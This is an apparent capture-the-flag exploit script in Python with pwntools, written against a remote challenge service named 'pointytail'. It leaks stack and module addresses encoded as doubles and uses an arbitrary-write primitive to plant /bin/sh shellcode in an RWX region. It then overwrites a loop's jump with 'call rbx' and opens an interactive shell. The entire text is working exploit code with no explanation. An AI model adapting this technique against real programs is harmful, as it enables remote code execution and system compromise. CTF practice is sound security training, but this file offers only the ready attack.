from pwn import *
from sys import *

context.arch='amd64'

def do2hex(f):
	return (struct.unpack('<Q', struct.pack('<d', f))[0])

def hex2do(f):
	return struct.unpack('<d', f)[0]

HOST = "fun.chall.seetf.sg"
PORT = 50007
#p = process(["dotnet", "pointytail.dll"])
p = remote(HOST,PORT)
print(util.proc.pidof(p))
p.sendline(b'a')
p.recvuntil(b's = ')

res = (p.recvline()[1:-2]).split(b', ')
leak = do2hex(float(res[0]))
stack = do2hex(float(res[1]))
print(hex(leak), hex(stack))


arg1 = hex2do(p64(leak-8))
arg2 = hex2do(p64(stack))
p.sendline(f"s {arg1} {arg2}")
p.sendline(b'1')
p.recvuntil(b'c = ')
p.recvuntil(b'c = ')
res = p.recvline()[1:-2].split(b', ')
rwxp = do2hex(float(res[0]))-0xe92b0
print("rwxp: ", hex(rwxp))


sc = asm(shellcraft.sh())
chunks, chunk_size = len(sc), len(sc)//6
sc = [ sc[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
print(sc)

target = rwxp
target_jmp = rwxp+0x14b95
arg1 = hex2do(p64(target-8))
arg2 = hex2do(p64(stack))
p.sendline(f"s {arg1} {arg2}")

payload = b'\x90'*8
write1 = hex2do((payload))
write2 = hex2do((payload))

p.sendline(f"c {write1} {write2}")

#Write Shellcode
for i in range(0,len(sc),2):
	target = rwxp+((i+1)*8)
	arg1 = hex2do(p64(target))
	arg2 = hex2do(p64(stack))
	p.sendline(f"s {arg1} {arg2}")
	
	write1 = hex2do(sc[i])
	write2 = hex2do(sc[i+1])
	p.sendline(f"c {write1} {write2}")


shell = (asm(f"""
	nop
	nop
	nop
	nop
	mov rbx, {rwxp}
	call rbx
	"""
	))
chunks, chunk_size = len(shell), len(shell)//2
shell = [ shell[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]

#Overwrite jump while(1) to call rbx
for i in range(0,len(shell),2):
	target = target_jmp
	arg1 = hex2do(p64(target-8))
	arg2 = hex2do(p64(stack))
	p.sendline(f"s {arg1} {arg2}")
	
	write1 = hex2do(shell[i])
	write2 = hex2do(shell[i+1])
	p.sendline(f"c {write1} {write2}")


p.interactive()

